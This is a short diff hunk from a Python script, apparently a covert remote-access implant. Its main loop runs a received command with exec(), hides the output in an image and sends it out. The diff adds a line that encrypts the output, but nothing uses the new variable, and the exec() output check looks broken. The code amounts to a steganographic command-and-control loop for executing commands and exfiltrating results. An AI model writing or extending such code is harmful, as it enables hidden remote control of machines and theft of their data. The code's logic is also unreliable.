@@ -116,6 +116,7 @@ if __name__ == '__main__':
             cmd = encrypted_cmd
             output = exec(cmd) 
             if output != "": 
+                msg = encrypt(output)
                 obf_img = mod_img(output)
                 send_output(obf_img)
         except Exception as e: 
